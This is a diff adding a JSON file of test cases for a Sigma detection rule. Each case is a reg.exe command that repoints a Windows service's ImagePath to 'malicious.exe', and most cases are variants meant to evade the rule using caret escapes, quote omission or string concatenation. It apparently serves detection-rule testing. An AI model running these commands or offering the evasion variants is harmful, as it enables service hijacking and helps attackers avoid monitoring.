@@ -1,0 +1,22 @@
+[
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LegitService\" /v \"ImagePath\" /t REG_EXPAND_SZ /d \"malicious.exe\" /f",
+    "explanation": "Original command line that matches the Sigma rule by modifying the ImagePath registry key with a Medium integrity process."
+  },
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LegitService\" ^/v \"ImagePath\" ^/t REG_EXPAND_SZ ^/d \"malicious.exe\" ^/f",
+    "explanation": "Bypass attempt using escape characters (^) for substitution and insertion techniques to alter syntax while maintaining the same behavior."
+  },
+  {
+    "output": "reg.exe add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LegitService /v ImagePath /t REG_EXPAND_SZ /d malicious.exe /f",
+    "explanation": "Bypass attempt using double backslashes and omission of quotes to test if the rule is sensitive to these changes."
+  },
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LegitService\" /v \"Image\"+\"Path\" /t REG_EXPAND_SZ /d \"malicious.exe\" /f",
+    "explanation": "Bypass attempt using string concatenation (\"Image\"+\"Path\") to evade simple string-based detection."
+  },
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LegitService\" /v ImagePath /t REG_EXPAND_SZ /d malicious.exe /f",
+    "explanation": "Bypass attempt using omission of quotes around the ImagePath and executable name to test detection sensitivity."
+  }
+]
